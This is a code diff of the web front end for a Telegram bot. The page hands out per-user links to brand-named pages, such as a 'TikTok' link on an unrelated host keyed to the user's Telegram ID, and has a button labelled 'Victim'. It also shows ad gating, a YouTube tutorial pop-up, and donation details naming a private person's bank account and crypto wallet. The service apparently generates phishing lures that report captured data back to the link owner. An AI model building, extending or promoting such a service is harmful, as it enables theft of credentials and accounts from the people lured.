+  {name:"TikTok",           image:"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS2sZ4tDoHuXJBWzuZIkGQbWxLpV2gzx0TMDA&s",urlTemplate:"https://knlok.xo.je/sc/t.html?id={telegram-id}"},
+];
+function formatUrl(t){if(!telegramId)return'#';return t.replace('{telegram-id}',telegramId);}
 
-  /* Body */
-  .yt-body { padding: 10px 14px 12px; }
-  .yt-body > p {
-    font-size: 0.83rem; color: #b0b8cc;
-    line-height: 1.6; margin-bottom: 12px; text-align: center;
-  }
-  .yt-body > p strong { color: #f0f2f7; }
+function renderFreeLinks(){
+  const list=document.getElementById('freeLinksList');list.innerHTML='';
+  freeLinks.forEach(link=>{
+    const url=formatUrl(link.urlTemplate);
+    const row=document.createElement('div');row.className='tool-row';
+    row.innerHTML=`<img class="tool-icon" src="${link.image}" alt="${link.name}" loading="lazy" onerror="this.style.background='var(--s3)'"><div class="tool-info"><div class="tool-name">${link.name}</div><div class="tool-sub"><span class="chip-acc">FREE</span></div></div><div class="tool-btns"><button class="tb" data-copy="${url}">Copy</button><button class="tb open-btn" data-open="${url}">Open</button></div>`;
+    row.querySelector('[data-copy]').addEventListener('click',function(){navigator.clipboard.writeText(this.dataset.copy).then(()=>{const orig=this.textContent;this.textContent='✓ Copied';this.style.cssText='background:rgba(0,212,170,.15);color:var(--acc);border-color:rgba(0,212,170,.3)';setTimeout(()=>{this.textContent=orig;this.style.cssText='';},1600);});});
+    row.querySelector('[data-open]').addEventListener('click',function(){const u=this.dataset.open;showMyAdWithNotice(function(){window.open(u,'_blank','noopener');});});
+    list.appendChild(row);
+  });
+}
 
-  /* Steps */
-  .yt-steps { display: flex; flex-direction: column; gap: 6px; margin-bottom: 14px; }
-  .yt-step {
-    display: flex; align-items: center; gap: 9px;
-    background: rgba(255,0,0,0.07);
-    border: 1px solid rgba(255,80,80,0.2);
-    border-radius: 9px; padding: 7px 11px;
-    font-size: 0.82rem; color: #ffd0d0; font-weight: 500;
+/* Donation */
+function isNigeria(){return new Date().getTimezoneOffset()===-60;}
+function renderDonationInfo(){
+  const el=document.getElementById('donationInfo');
+  if(isNigeria()){
+    el.innerHTML=`<div class="donate-card-head"><div class="d-icon">🏦</div><h3>Nigeria Bank Transfer (Opay)</h3></div><div class="donate-rows"><div class="donate-row"><span class="dr-label">Bank</span><span class="dr-val">Opay</span></div><div class="donate-row"><span class="dr-label">Name</span><span class="dr-val">Olatunji Abdumalik Ayomide</span></div></div><div class="acct-number">9114301708</div><button class="copy-row-btn" onclick="navigator.clipboard.writeText('9114301708').then(()=>showToast('Account number copied ✅','suc'))">📋 Copy Account Number</button>`;
+  }else{
+    el.innerHTML=`<div class="donate-card-head"><div class="d-icon">🪙</div><h3>Crypto Donation · BNB / USDT (BEP20)</h3></div><div class="crypto-addr">0xbBcc409872bC2441400735624638F3D67DAa7C4C</div><button class="copy-row-btn" onclick="navigator.clipboard.writeText('0xbBcc409872bC2441400735624638F3D67DAa7C4C').then(()=>showToast('Address copied ✅','suc'))">📋 Copy Wallet Address</button>`;
   }
-  .yt-step span:first-child { font-size: 1rem; flex-shrink: 0; }
+}
 
-  /* Subscribe button */
-  .yt-btn-sub {
-    display: block; width: 100%;
-    background: linear-gradient(135deg, #cc0000, #ff2222);
-    color: #fff; font-weight: 700; font-size: 0.9rem;
-    padding: 11px; border: none; border-radius: 10px;
-    cursor: pointer; text-align: center; text-decoration: none;
-    transition: opacity 0.2s, transform 0.15s; margin-bottom: 8px;
-    box-sizing: border-box;
-  }
-  .yt-btn-sub:hover { opacity: 0.9; transform: translateY(-1px); }
+function copyInviteLink(){const l=`https://t.me/intelligentverificationlinkbot?start=r${telegramId}`;navigator.clipboard.writeText(l).then(()=>showToast('Invite link copied ✅','suc'));}
 
-  /* Cancel link */
-  .yt-btn-cancel {
-    display: block; width: 100%; background: transparent;
-    color: #6e7a94; font-size: 0.82rem; font-weight: 500;
-    padding: 7px; border: none; cursor: pointer;
-    text-align: center; transition: color 0.2s;
-  }
-  .yt-btn-cancel:hover { color: #b0b8cc; }
-</style>
+/* Bot button listeners */
+document.getElementById('openBotBtnHome').addEventListener('click',function(){showMyAdWithNotice(function(){window.open('http://t.me/intelligentverificationlinkbot/customlink','_blank');});});
+document.getElementById('openBotBtnVictim').addEventListener('click',function(){showMyAdWithNotice(function(){window.open('https://t.me/intelligentverificationlinkbot?start=start','_blank');});});
 
-<!-- ── YouTube Widget HTML ── -->
+renderFreeLinks();
+renderDonationInfo();
+waitForPremiumList();
+</script>
+
+<!-- YOUTUBE WIDGET -->
 <div id="ytModal">
   <div class="yt-sheet">
-
     <div class="yt-banner">
-      <button class="yt-close" onclick="closeYtModal()" title="Close">✕</button>
+      <button class="yt-close" onclick="closeYtModal()">✕</button>
       <div class="yt-banner-icon">▶️</div>
       <h3>New Here? Watch Our Tutorials!</h3>
       <p>Learn how to use the bot like a pro</p>
     </div>
-
     <div class="yt-body">
-      <p>If you're <strong>new to this bot</strong>, please visit our YouTube channel to understand how everything works.</p>
-
+      <p>If you're <strong>new to this bot</strong>, visit our YouTube channel to understand how everything works.</p>
       <div class="yt-steps">
-        <div class="yt-step"><span>🔔</span><span>Subscribe &amp; turn on notification bell</span></div>
+        <div class="yt-step"><span>🔔</span><span>Subscribe &amp; turn on notifications</span></div>
         <div class="yt-step"><span>🎬</span><span>Watch our tutorial videos</span></div>
         <div class="yt-step"><span>📚</span><span>Learn the bot before you start</span></div>
         <div class="yt-step"><span>✅</span><span>Use the bot with full confidence</span></div>
       </div>
-
-      <a href="https://youtube.com/@harmayointelligent?si=fwvV6eTZZgGAjS6J"
-         target="_blank" rel="noopener"
-         class="yt-btn-sub"
-         onclick="closeYtModal()">
-        ▶ Visit YouTube Channel
-      </a>
+      <a href="https://youtube.com/@harmayointelligent?si=fwvV6eTZZgGAjS6J" target="_blank" rel="noopener" class="yt-btn-sub" onclick="closeYtModal()">▶ Visit YouTube Channel</a>
       <button class="yt-btn-cancel" onclick="closeYtModal()">I already know how to use it</button>
     </div>
-
   </div>
 </div>
-
-<!-- ── YouTube Widget Script ── -->
 <script>
-  (function () {
-    var _ytShown = false;
-
-    function openYtModal() {
-      if (_ytShown) return;
-      var modal = document.getElementById("ytModal");
-      if (!modal) return;
-      modal.classList.remove("show");
-      modal.style.display = "none";
-      void modal.offsetWidth;
-      modal.style.display = "flex";
-      modal.classList.add("show");
-      _ytShown = true;
-    }
-
-    window.closeYtModal = function () {
-      var modal = document.getElementById("ytModal");
-      if (!modal) return;
-      modal.classList.remove("show");
-      modal.style.display = "none";
-    };
-
-    function scheduleYtModal() {
-      if (_ytShown) return;
-      setTimeout(openYtModal, 8000);
-    }
-
-    if (document.readyState === "complete") {
-      scheduleYtModal();
-    } else {
-      window.addEventListener("load", scheduleYtModal);
-    }
-  })();
+(function(){var _s=false;function open(){if(_s)return;var m=document.getElementById('ytModal');if(!m)return;m.style.display='flex';m.classList.add('show');_s=true;}window.closeYtModal=function(){var m=document.getElementById('ytModal');if(m){m.classList.remove('show');m.style.display='none';}};if(document.readyState==='complete'){setTimeout(open,8000);}else{window.addEventListener('load',function(){setTimeout(open,8000);});}})();
 </script>
-<!-- ══ End of YouTube Widget ══ -->
 
 </body>
 </html>
